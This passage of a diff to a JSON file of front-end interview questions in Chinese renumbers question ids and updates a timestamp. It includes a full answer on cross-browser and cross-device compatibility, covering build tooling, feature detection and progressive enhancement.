           "content": "2025-11-21-22-12-43-image.png\n\n2025-11-21-22-13-18-image.png",
           "hasAnswer": true
         },
         {
-          "id": "open-questions-4",
+          "id": "open-questions-5",
           "title": "海报绘制",
           "content": "海报绘制",
           "hasAnswer": false
         },
         {
-          "id": "open-questions-5",
+          "id": "open-questions-6",
           "title": "自动化发布",
           "content": "自动化发布\n2025-11-21-22-06-49-image.png",
           "hasAnswer": false
         },
         {
-          "id": "open-questions-6",
+          "id": "open-questions-7",
           "title": "跨浏览器 跨终端开发的兼容性处理方案",
           "content": "##### 跨浏览器 跨终端开发的兼容性处理方案\n\n确保同一个网页或Web应用在**不同的浏览器**上和在**不同类型的设备**上都能具有**一致的外观、布局和功能**，提供**良好的用户体验**。\n\n挑战：\n\n不同浏览器：CSS 渲染差异，JavaScript API 支持度不同\n\n不同设备：屏幕尺寸与分辨率，输入方式差异，性能与网络条件\n\n解决：\n\n开发工具链：\n\n```js\n\"@babel/core\": \"^7.20.0\",          // JavaScript 转译\n\"autoprefixer\": \"^10.4.13\",        // CSS 自动前缀\n\"postcss\": \"^8.4.21\",              // CSS 后处理\n\"eslint\": \"^8.30.0\",               // 代码检查\n\"stylelint\": \"^14.16.0\",           // CSS 检查\n```\n\n检测与兼容性查询能力：\n\n```js\nserviceWorker：'serviceWorker' in navigator\nIntersectionObserver：'IntersectionObserver' in window\n响应式图片：<picture> + <source > 等\nwebp：document.createElement('canvas').toDataURL('image/webp').indexOf('data:image/webp') === 0\nCan I Use：caniuse.isSupported(feature, navigator.userAgent)\n```\n\n原则和思路：\n\n- **渐进增强**：从基础功能开始，逐步为现代浏览器增强体验\n\n- **优雅降级**：现代功能不可用时，提供可用的降级方案\n\n- **移动优先**：从小屏幕开始设计，逐步适配大屏幕\n\n- **使用标准 API**：优先选择广泛支持的 Web 标准\n\n- **特性检测**：运行时检测浏览器能力，而非浏览器嗅探\n\n- **响应式设计**：使用弹性布局和媒体查询\n\n- **性能考量**：考虑不同设备的性能差异\n\n- **工具自动化**：使用构建工具处理大部分兼容性问题\n\n- **组件库**：使用成熟的 UI 库（如 Ant Design、Material-UI）",
           "hasAnswer": true
@@ -1592,5 +1646,5 @@
       ]
     }
   ],
-  "generatedAt": "2025-12-30T17:14:57.223Z"
+  "generatedAt": "2026-01-03T11:08:21.327Z"
 }
